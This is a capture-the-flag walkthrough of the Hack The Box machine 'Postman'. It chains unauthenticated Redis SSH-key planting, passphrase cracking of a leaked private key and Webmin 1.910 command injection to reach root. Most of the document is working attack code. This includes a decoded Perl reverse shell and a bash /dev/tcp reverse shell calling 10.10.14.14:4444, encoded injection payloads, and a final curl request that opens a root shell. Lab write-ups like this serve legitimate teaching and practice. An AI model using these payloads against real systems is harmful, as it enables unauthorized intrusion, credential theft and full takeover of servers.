# Postman

Info
* OS: Linux
* Difficulty: easy
* IP: `10.10.10.160`

Vulnerabilities
* redis
* webmin

<!--

Required tools
* nmap
* burpsuite
* john
* metasploit

Other commands/tools
```
redis-cli
gobuster
find . -writable -ls
find . -readable -ls
# lists files between dates
find / -newermt YYYY-MM-DD ! -newermt YYYY-MM-DD -ls 2>/dev/null
exiftool
stat
strings
```

-->

## Walkthrough

Other
* [IppSec](https://www.youtube.com/watch?v=jJnHET1o8ZQ) (video)

### Enumeration

Nmap
```bash
nmap -p- -T4 --min-rate=1000 -sC -sV 10.10.10.160

# output
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# redis
nmap --script redis-info -p 6379 10.10.10.160
```

Verify open ports
```bash
ssh root@10.10.10.160
http 10.10.10.160:80
echo "PING" | nc 10.10.10.160 6379
http --verify=no https://10.10.10.160:10000
```

Redis
* [Redis post-exploitation](https://github.com/niqdev/strawhatsec/blob/main/gitbook/htb/linux/15-redis-post-exploitation.pdf)
* [Unauthorized SSH access](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh)
```bash
# install client
apt install -y redis
echo "PING" | redis-cli -h 10.10.10.160

# generate key pair
ssh-keygen -N "" -f ~/.ssh/postman

# important append \n\n before and after the pub key
(echo -e "\n\n"; cat ~/.ssh/postman.pub; echo -e "\n\n") > ~/.ssh/postman.txt

# create fake redis key/value (without `save` it's lost)
cat ~/.ssh/postman.txt | redis-cli -h 10.10.10.160 -x set ssh-postman

# continue the commands and save
nc -v 10.10.10.160 6379
# verify key content - without \n\n the content is corrupted
GET ssh-postman
# create backup directory
CONFIG set dir /var/lib/redis/.ssh
# create backup db
CONFIG set dbfilename authorized_keys
# save and exit
SAVE

# private key permissions
chmod 600 ~/.ssh/postman
# access to instance "redis@Postman"
ssh -o StrictHostKeyChecking=no -i ~/.ssh/postman redis@10.10.10.160
```

### Lateral Movement

Upload privesc scripts
```bash
# get <IP_ADDRESS>
ifconfig tun0 | grep inet | awk 'FNR == 1 {print $2}'

mkdir -p /share/www

# expose single file
curl -sS -L -o /share/www/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
curl -sS -L -o /share/www/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# run static server
python3 -m http.server -d /share/www

# download scripts
ssh -o StrictHostKeyChecking=no -i ~/.ssh/postman redis@10.10.10.160
cd /dev/shm
# use <IP_ADDRESS>
wget 10.10.14.14:8000/linpeas.sh
bash linpeas.sh
wget 10.10.14.14:8000/LinEnum.sh
bash LinEnum.sh
```

Output of privesc scripts
```bash
# readable encrypted private key
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
```

Brute force encrypted key passphrase
```bash
# copy from redis@Postman
cat /opt/id_rsa.bak 
#-----BEGIN RSA PRIVATE KEY-----
#Proc-Type: 4,ENCRYPTED
#DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

# copy locally
vim /share/postman.ssh

# convert to compatible format
find / -name "*ssh2john*" 2>/dev/null
# old
python3 /usr/share/john/ssh2john.py /share/postman.ssh > /share/postman.ssh.john
# latest (python 3.9)
curl -sS -L -o /share/ssh2john.py https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
python3 /share/ssh2john.py /share/postman.ssh > /share/postman.ssh.john

# password: computer2008
tar xvzf /wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /share
john /share/postman.ssh.john --wordlist=/share/rockyou.txt
# user access
su - Matt

# flag
cat /home/Matt/user.txt
```

### Privilege Escalation

#### Exploit with Metasploit

```bash
# search exploits
# Webmin version: 1.910
searchsploit webmin -j

# start console
msfconsole

# search exploits
search webmin

# select exploit
info exploit/linux/http/webmin_packageup_rce
use exploit/linux/http/webmin_packageup_rce

# list parameters
show options

set RHOSTS 10.10.10.160
set LHOST tun0
set USERNAME Matt
set PASSWORD computer2008
set SSL true
exploit

# flag
cat /toot/root.txt
```

#### Exploit manually

Intercept Metasploit requests with Burp
```bash
# save <BURP_SUITE_IP_ADDRESS> eth0
ifconfig

# config metasploit
vi /etc/hosts
# <BURP_SUITE_IP_ADDRESS> burpsuite
ping burpsuite

show advanced options
# setup proxy on port 8090
set Proxies http:burpsuite:8090
set ReverseAllowProxy true
exploit

# >>> intercept with Burp Suite
```

Inspect Metasploit requests
```bash
# headers
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
Cookie: sid=fa9158d7af820394e523a31a9bfa95bc

# request
u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNDo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages

# decoded request
u=acl/apt&u= | bash -c "{echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNDo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=}|{base64,-d}|{bash,-i}"&ok_top=Update+Selected+Packages

# payload
echo "cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNDo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Oyc=" | base64 -d

# decoded payload
perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.14:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```

Build payload
```bash
# issues with httpie, prefer curl
# https://github.com/httpie/httpie/issues/534
# -n: do not print trailing newline
# --form adds also the charset by default which is causing the request to fail and needs to be explicitly removed
# Content-Type: application/x-www-form-urlencoded; charset=utf-8
echo -n "user=Matt&pass=computer2008" | \
  http -v --verify=no --form https://10.10.10.160:10000/session_login.cgi \
  'Content-Type:application/x-www-form-urlencoded' \
  'Cookie:testing=1'

# -i: prints only headers
# -k: trust certificate
# -b: cookie
# get SID
curl -i -k -b 'testing=1' \
  --data-binary 'user=Matt&pass=computer2008' \
  https://10.10.10.160:10000/session_login.cgi

# IMPORTANT for curl+bash: see "--data-binary $'<STRING_PAYLOAD>'"
# https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html
# https://unix.stackexchange.com/questions/115612/understanding-two-flags-and-a-dollar-sign-in-a-curl-command

# send payload format
curl -i -sS -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'testing=1; sid=<SID>' \
  --data-binary $'<STRING_PAYLOAD>' \
  https://10.10.10.160:10000/package-updates/update.cgi

# https://unix.stackexchange.com/questions/159253/decoding-url-encoding-percent-encoding
alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'

urldecode 'u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages'
# output
u=acl/apt&u= | bash -c "{echo,<ENCODED_PAYLOAD>}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
# this is how the payload should be built
u=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages

# test locally: verify bash expansion without spaces - it can't contain pipes
bash -c "{ping,-c,1,127.0.0.1}"
# intercept packets locally
tcpdump -i lo -n icmp

# e.g. tun0 10.10.14.14
ifconfig
# intercept packets
tcpdump -i tun0 -n icmp
ping 10.10.10.160
bash -c "{ping,-c,1,10.10.14.14}"

# $'<STRING_PAYLOAD>' test ping
$'u=acl/apt&u= | bash -c "{ping,-c,1,10.10.14.14}"&ok_top=Update Selected Packages'

# encode ping
echo -n 'ping -c 1 10.10.14.14' | base64
# exec encoded ping
{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE0,}|{,base64,-d}|{bash,-i}

# $'<STRING_PAYLOAD>' test encoded ping (both valid)
$'u=acl/apt&u= | bash -c "{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE0,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
$'u=acl/apt&u= | bash -c "{echo,cGluZyAtYyAxIDEwLjEwLjE0LjE0}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'

# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# listen
nc -lvnp 4444
# example reverse shell e.g. tun0 10.10.14.14
bash -i >& /dev/tcp/10.10.14.14/4444 0>&1

# encode reverse shell
echo -n 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1' | base64
# alternatively replace spaces with commas inside bash command (equivalent)
echo -n 'bash,-i,>&,/dev/tcp/10.10.14.14/4444,0>&1' | base64
# output (with spaces, no commas)
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=

# verify encoding
echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=' | base64 -d
# listen
nc -lvnp 4444
# exec encoded reverse shell
{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=,}|{,base64,-d}|{bash,-i}

# $'<STRING_PAYLOAD>' test reverse shell: corrupted
$'u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'

# $'<STRING_PAYLOAD>' test reverse shell: fix corrupted chars in base64 payload
# replace + in base64 with %2B
# replace = in base64 with %3D
$'u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
$'u=acl/apt&u= | bash -c "{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
```

Final exploit
```bash
# listen
nc -lvnp 4444

# get sid from header
curl -i -k -b 'testing=1' \
  --data-binary 'user=Matt&pass=computer2008' \
  https://10.10.10.160:10000/session_login.cgi

# open reverse shell on 10.10.14.14:4444
curl -i -sS -k -X POST \
  -H 'Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'testing=1; sid=<SID>' \
  --data-binary $'u=acl/apt&u= | bash -c "{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages' \
  https://10.10.10.160:10000/package-updates/update.cgi
```
